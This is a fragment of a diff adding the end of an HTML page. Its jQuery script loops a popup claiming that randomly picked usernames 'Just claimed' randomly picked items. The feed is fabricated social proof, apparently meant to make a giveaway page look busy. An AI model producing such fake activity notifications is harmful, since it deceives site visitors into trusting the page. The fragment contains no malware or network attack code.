+            'StarGirl25', 'QueenBee07', 'PrincessLily22', 'GamerGirl101', 'SweetPea13',
+            'LunaLove08', 'DivaStar99', 'GlitterQueen55', 'SunshineGal12', 'BellaDream18',
+            'Moonlight21', 'Fashionista99', 'SparkleStar08', 'RosyGamer33', 'StarlightGirl88',
+            'CandyQueen47', 'LilMiss24', 'DaisyGirl92', 'PinkPrincess23', 'ChicGirl19',
+            'DreamyBella17', 'CutiePie06', 'HappyStar28', 'GlitterGirl77', 'CoolGirl31'
+        ];
+
+
+
+        function showAndHide() {
+            setTimeout(function() {
+                $(".cliameds").fadeIn(); 
+                var html = `
+                <div class="message animate_animated animate_bounceInLeft">
+                        <img class="border-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXJ7XHy-yIbt8eS8WNe8NScejWkLA3j-3Pztrn1BEOQPZNexvSv1vgBfqW-g7ssPVSKeppDSIQhrQuoIv6Kzq1vIInol_96W3BFHSmRNzJ2gJCLP-W0RQXSruj50mgLZl_he4Mz9dltgSliZ5qZBvUHcA4OTZ3OjQ4BdjtnipwycPh9ZqAnEWr81QFiPU/w160-h200/toppng.com-christmas-border-800x1000.png" alt="">
+                        <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
+                        <div class="more">
+                            <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
+                            <div>Just claimed '${items[Math.floor(Math.random() * items.length)]}'</div>
+                        </div>
+                    </div>
+                `;
+                $(".cliameds").html(html);
+
+                setTimeout(function() {
+                    $(".cliameds").fadeOut(showAndHide);  
+                }, 4000);  // 4000 ms = 4 seconds
+            }, 3000);  // 3000 ms = 3 seconds
+        }
+
+        showAndHide(); 
+
+        </script>
+    
+</body>
+</html>
